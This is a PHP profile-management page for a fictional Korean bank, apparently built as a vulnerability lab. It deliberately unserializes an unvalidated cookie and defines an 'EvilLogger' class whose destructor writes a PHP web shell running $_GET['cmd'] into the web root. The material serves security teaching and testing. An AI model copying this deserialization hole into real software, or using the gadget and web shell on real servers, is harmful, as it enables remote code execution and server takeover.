<?php
include 'db.php';
if (!isset($_SESSION['userid'])) {
    header("Location: login.php");
    exit;
}

$userid = $_SESSION['userid'];
$msg = "";

// ==========================================
// [취약점 시뮬레이션용 클래스 및 객체 주입 로직]
// ==========================================

// 1. 사용자 설정 객체 클래스 (정상적인 용도)
class UserPreference {
    public $theme = "light";
    public $layout = "default";
    
    public function __destruct() {
        // 정상 객체일 때는 간단히 테마 적용 메시지 출력 등 수행
    }
}

class EvilLogger {
    public $filename = "/var/www/html/shell.php";
    public $content = "<?php system(\$_GET['cmd']); ?>";

    public function __destruct() {
        // 취약점 발동 시점
        @file_put_contents($this->filename, $this->content);
    }
}

// 2. 쿠키 기반 설정 관리 (취약점 포인트)
$current_pref = null;

if (isset($_COOKIE['profile_config'])) {
    // 취약점 핵심: 검증 없이 사용자 쿠키 값을 그대로 unserialize
    // 공격자가 이 쿠키에 EvilLogger 객체의 직렬화 데이터를 넣으면 __destruct가 실행됨
    $current_pref = @unserialize(base64_decode($_COOKIE['profile_config']));
}

// 쿠키가 없거나 유효하지 않으면 기본 객체 생성 후 쿠키 발급
if (!$current_pref || !is_object($current_pref)) {
    $default_pref = new UserPreference();
    setcookie('profile_config', base64_encode(serialize($default_pref)), time() + (86400 * 30), "/");
}

// ==========================================
// 기존 회원 정보 관리 로직
// ==========================================

// 정보 수정 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update'])) {
    $name = $_POST['name'];
    $phone = $_POST['phone'];
    $account_number = $_POST['account_number'];

    $stmt = $conn->prepare("UPDATE users SET name = ?, phone = ?, account_number = ? WHERE userid = ?");
    $stmt->bind_param("ssss", $name, $phone, $account_number, $userid);
    if ($stmt->execute()) {
        $_SESSION['name'] = $name;
        $msg = "고객님의 정보가 성공적으로 수정되었습니다.";
    } else {
        $msg = "정보 수정에 실패했습니다: " . $stmt->error;
    }
    $stmt->close();
}

// 회원탈퇴 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete'])) {
    $stmt = $conn->prepare("DELETE FROM users WHERE userid = ?");
    $stmt->bind_param("s", $userid);
    $stmt->execute();
    $stmt->close();
    
    session_destroy();
    header("Location: index.php");
    exit;
}

// 회원 정보 조회
$stmt = $conn->prepare("SELECT userid, name, phone, account_number, regdate FROM users WHERE userid = ?");
$stmt->bind_param("s", $userid);
$stmt->execute();
$user = $stmt->get_result()->fetch_assoc();
$stmt->close();
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>고객정보관리 - est은행</title>
    <style>
        body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background-color: #f8f9fa; }
        header { background-color: #4A2E18; color: white; padding: 20px 50px; }
        .container { width: 600px; margin: 30px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        h2 { color: #4A2E18; margin-top: 0; }
        label { display: block; margin-top: 15px; font-weight: bold; font-size: 14px; }
        input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn-group { display: flex; gap: 10px; margin-top: 25px; }
        button { flex: 1; padding: 12px; border: none; font-weight: bold; font-size: 15px; border-radius: 6px; cursor: pointer; }
        .btn-update { background: #4A2E18; color: white; }
        .btn-delete { background: #dc3545; color: white; }
        button:hover { opacity: 0.9; }
        .msg { margin-top: 15px; color: blue; font-weight: bold; text-align: center; }
        .back-link { display: block; text-align: center; margin-top: 20px; text-decoration: none; color: #666; }
    </style>
</head>
<body>
    <header><h1>🏦 est은행 고객정보 관리</h1></header>
    <div class="container">
        <h2>내 정보 조회 및 수정</h2>
        <?php if($msg) echo "<p class='msg'>$msg</p>"; ?>
        <form method="POST" action="">
            <label>아이디 (변경 불가)</label>
            <input type="text" value="<?php echo htmlspecialchars($user['userid']); ?>" disabled style="background:#e9ecef;">
            
            <label>성명</label>
            <input type="text" name="name" value="<?php echo htmlspecialchars($user['name']); ?>" required>
            
            <label>전화번호</label>
            <input type="text" name="phone" value="<?php echo htmlspecialchars($user['phone']); ?>" required>
            
            <label>계좌번호</label>
            <input type="text" name="account_number" value="<?php echo htmlspecialchars($user['account_number']); ?>" required>
            
            <div class="btn-group">
                <button type="submit" name="update" class="btn-update">정보 수정</button>
                <button type="submit" name="delete" class="btn-delete" onclick="return confirm('정말 회원탈퇴를 진행하시겠습니까? 데이터가 모두 삭제됩니다.');">회원탈퇴</button>
            </div>
        </form>
        <a href="index.php" class="back-link">&lt; 메인 화면으로 돌아가기</a>
    </div>
</body>
</html>
